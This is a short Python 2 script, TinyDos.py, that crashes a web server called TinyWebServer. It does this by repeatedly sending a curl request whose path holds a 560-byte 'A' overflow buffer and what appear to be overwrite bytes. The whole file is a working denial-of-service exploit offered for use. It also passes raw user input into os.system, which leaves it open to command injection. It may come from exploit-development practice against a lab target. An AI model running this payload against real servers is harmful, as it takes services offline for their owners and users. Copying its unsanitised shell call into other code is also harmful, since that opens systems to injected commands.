from os import system

print """
TinyDos.py- a simple Denial-of-Service script for TinyWebServer. 
"""
target = raw_input("Please input the target URI:\n(127.0.0.1) >")
port = raw_input("Input the target port:\n(9999) >")
iters = raw_input("Input number of times to send evil buffer to crash the server:\n(12)>")
if (len(target) == 0):
    target = "127.0.0.1"
if (len(port) == 0):
    port = "9999"
if (len(iters)==0):
    iters = 12
else:
    iters = int(iters)

print "Fire ze missiles!"
for i in range(iters-1):
    print "\nSending evil buffer number %s of %s" % (i+1, iters)
    comm = "/usr/bin/curl " + str(target) + ":" + str(port) + "/\"" + "A"*560 + "\xb0\x21\x40\xff\""
    system(comm)
    
